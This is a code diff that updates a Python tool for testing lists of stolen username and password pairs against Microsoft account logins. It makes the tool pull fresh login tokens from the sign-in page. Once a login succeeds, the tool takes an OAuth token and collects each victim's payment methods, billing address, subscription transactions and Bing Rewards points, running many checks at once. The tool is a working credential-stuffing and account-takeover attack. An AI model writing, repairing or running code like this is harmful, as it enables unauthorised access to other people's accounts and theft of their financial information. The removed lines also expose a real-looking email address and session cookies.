@@ -29,23 +29,23 @@ def check_status(text, url, cookies):
         return "SUCCESS"
     return "UNKNOWN_FAILURE"
 
-LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
+# Initial authorize URL to GET fresh login page
+AUTHORIZE_URL = (
+    "https://login.live.com/oauth20_authorize.srf"
+    "?client_id=0000000048170EF2"
+    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
+    "&response_type=token"
+    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
+    "&display=touch"
+)
 
-LOGIN_HEADERS = {
-    "Host": "login.live.com", "Connection": "keep-alive", "Cache-Control": "max-age=0",
-    "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-    "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-    "Upgrade-Insecure-Requests": "1", "Origin": "https://login.live.com",
-    "Content-Type": "application/x-www-form-urlencoded",
+COMMON_HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
-    "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
     "Accept-Language": "en-US,en;q=0.9",
-    "Cookie": "MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89",
     "Accept-Encoding": "gzip, deflate",
 }
+
 
 def check_account(credential):
     try:
@@ -54,18 +54,50 @@ def check_account(credential):
         return {"status": "fail", "user": credential, "password": "", "detail": "Bad format"}
 
     s = requests.Session()
+    s.headers.update(COMMON_HEADERS)
 
     try:
+        # ── Step 1: GET the login page to extract fresh PPFT + urlPost ──
+        r0 = s.get(AUTHORIZE_URL, allow_redirects=True, timeout=15)
+        page = r0.text
+
+        ppft = parse_lr(page, 'name="PPFT" id="i0327" value="', '"')
+        if not ppft:
+            ppft = parse_lr(page, "sFT:'", "'")
+        if not ppft:
+            return {"status": "fail", "user": user, "password": password, "detail": "PPFT not found"}
+
+        url_post = parse_lr(page, "urlPost:'", "'")
+        if not url_post:
+            url_post = parse_lr(page, 'urlPost:"', '"')
+        if not url_post:
+            return {"status": "fail", "user": user, "password": password, "detail": "urlPost not found"}
+
+        # ── Step 2: POST login with fresh values ──
         data = (
             f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
-            f"&PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
+            f"&PPFT={quote(ppft)}"
             f"&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1"
             f"&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
             f"&login={quote(user)}&loginfmt={quote(user)}&type=11&LoginOptions=1"
             f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}"
         )
 
-        r1 = s.post(LOGIN_URL, headers=LOGIN_HEADERS, data=data, allow_redirects=True, timeout=15)
+        post_headers = {
+            "Host": "login.live.com",
+            "Connection": "keep-alive",
+            "Cache-Control": "max-age=0",
+            "Origin": "https://login.live.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document",
+            "Referer": r0.url,
+            "Upgrade-Insecure-Requests": "1",
+        }
+
+        r1 = s.post(url_post, headers=post_headers, data=data, allow_redirects=True, timeout=15)
         status = check_status(r1.text, r1.url, s.cookies.get_dict())
 
         if status != "SUCCESS":
@@ -79,8 +111,16 @@ def check_account(credential):
             s2, d = labels.get(status, ("fail", status))
             return {"status": s2, "user": user, "password": password, "detail": d}
 
-        # oauth token
-        oauth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
+        # ── Step 3: OAuth token ──
+        oauth_url = (
+            "https://login.live.com/oauth20_authorize.srf"
+            "?client_id=000000000004773A"
+            "&response_type=token"
+            "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
+            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
+            "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
+            "&prompt=none"
+        )
         r2 = s.get(oauth_url, headers={
             "Host": "login.live.com",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
@@ -94,7 +134,7 @@ def check_account(credential):
             return {"status": "locked", "user": user, "password": password, "detail": "Token Parse Fail"}
         token = unquote(token)
 
-        # payment info
+        # ── Step 4: Payment info ──
         pay_h = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
             "Pragma": "no-cache", "Accept": "application/json",
@@ -117,7 +157,7 @@ def check_account(credential):
         address1 = parse_lr(src3, '{"address_line1":"', '",') or "N/A"
         city = parse_lr(src3, '"city":"', '",') or "N/A"
 
-        # subscription
+        # ── Step 5: Subscription ──
         r5 = s.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=pay_h, timeout=15)
         src5 = r5.text
 
@@ -135,7 +175,7 @@ def check_account(credential):
         currency = parse_lr(src5, '"currency":"', '"') or ""
         total_amt = parse_lr(src5, '"totalAmount":', ',') or "N/A"
 
-        # bing points
+        # ── Step 6: Bing points ──
         points = "0"
         try:
             r4 = s.get("https://rewards.bing.com/", headers={
@@ -170,8 +210,8 @@ def check_account(credential):
 
     except requests.exceptions.RequestException:
         return {"status": "retry", "user": user, "password": password, "detail": "Connection Error"}
-    except Exception as e:
-        return {"status": "fail", "user": user, "password": password, "detail": str(e)}
+    except Exception as ex:
+        return {"status": "fail", "user": user, "password": password, "detail": str(ex)}
 
 
 def check_accounts(credentials, threads=15, on_progress=None, stop_event=None):
